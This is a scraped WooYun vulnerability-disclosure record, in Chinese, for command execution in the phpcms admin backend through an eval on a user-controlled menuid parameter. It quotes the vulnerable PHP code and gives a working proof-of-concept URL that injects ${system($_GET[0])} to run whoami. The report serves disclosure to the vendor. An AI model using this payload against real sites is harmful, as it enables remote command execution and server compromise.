{"id": 81452, "wybug_id": "wooyun-2015-0153630", "wybug_title": "phpcms后台低权限任意命令执行", "wybug_corp": "phpcms", "wybug_author": "一天到晚吃", "wybug_date": "2015-11-20 18:16", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "命令执行", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-26：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2016-01-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 11.10日下载的gbk版本存在命令执行问题。 详细说明：  tree.class.php中get_treeview函数调用了eval，刚好eval的参数受控\nfunction get_treeview($myid,$effected_id='example',$str=\"<span class='file'>\\$name</span>\", $str2=\"<span class='folder'>\\$name</span>\" ,$showlevel = 0 ,$style='filetree ' , $currentlevel = 1,$recursion=FALSE) {\t\techo \"str \".$str.\"<br>\".\"str2 \".$str2;        $child = $this->get_child($myid);        if(!defined('EFFECTED_INIT')){           $effected = ' id=\"'.$effected_id.'\"';           define('EFFECTED_INIT', 1);        } else {           $effected = '';        }\t\t$placeholder = \t'<ul><li><span class=\"placeholder\"></span></li></ul>';        if(!$recursion) $this->str .='<ul'.$effected.'  class=\"'.$style.'\">';        foreach($child as $id=>$a) {        \t@extract($a);\t\t\tif($showlevel > 0 && $showlevel == $currentlevel && $this->get_child($id)) $folder = 'hasChildren'; //如设置显示层级模式@2011.07.01        \t$floder_status = isset($folder) ? ' class=\"'.$folder.'\"' : '';\t\t            $this->str .= $recursion ? '<ul><li'.$floder_status.' id=\\''.$id.'\\'>' : '<li'.$floder_status.' id=\\''.$id.'\\'>';            $recursion = FALSE;            if($this->get_child($id)){            \teval(\"\\$nstr = \\\"$str2\\\";\");//str2参数受控制...\ncontent.php中调用了get_treeview函数\nif(!empty($categorys)) {\t\t\t$tree->init($categorys);\t\t\t\tswitch($from) {\t\t\t\t\tcase 'block':\t\t\t\t\t\t$strs = \"<span class='\\$icon_type'>\\$add_icon<a href='?m=block&c=block_admin&a=public_visualization&menuid=\".$_GET['menuid'].\"&catid=\\$catid&type=list' target='right'>\\$catname</a> \\$vs_show</span>\";\t\t\t\t\t\t$strs2 = \"<img src='\".IMG_PATH.\"folder.gif'> <a href='?m=block&c=block_admin&a=public_visualization&menuid=\".$_GET['menuid'].\"&catid=\\$catid&type=category' target='right'>\\$catname</a>\";\t\t\t\t\tbreak;\t\t\t\t\tdefault:\t\t\t\t\t\t$strs = \"<span class='\\$icon_type'>\\$add_icon<a href='?m=content&c=content&a=\\$type&menuid=\".$_GET['menuid'].\"&catid=\\$catid' target='right' onclick='open_list(this)'>\\$catname</a></span>\";//我们的menuid参数拼接后，进入到get_treeview函数中\t\t\t\t\t\t$strs2 = \"<span class='folder'>\\$catname</span>\";\t\t\t\t\t\tbreak;\t\t\t\t}\t\t\t$categorys = $tree->get_treeview(0,'category_tree',$strs,$strs2,$ajax_show);\t\t} else {\t\t\t$categorys = L('please_add_category');\t\t}        include $this->admin_tpl('category_tree');\t\texit;\n利用$_GET['menuid']构造，造成命令执行   漏洞证明：  POC:index.php?0=whoami&m=content&c=content&a=public_categorys&type=add&menuid=822;${system($_GET[0])}&pc_hash=vad6K3&from=block执行whoami命令\n\n\n\n   修复方案：  我就看看忽略不   版权声明：转载请注明来源 一天到晚吃@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-11-23 15:54 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-01-11 22:07 |    \t\timp0rt \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:52        | 剑影。。。)\t\t \n  666666666    \n     2016-01-12 19:16 |    \t\t一天到晚吃 \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:26        | 好好看，好好学test1xx)\t\t \n  @imp0rt 水一个洞～～    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}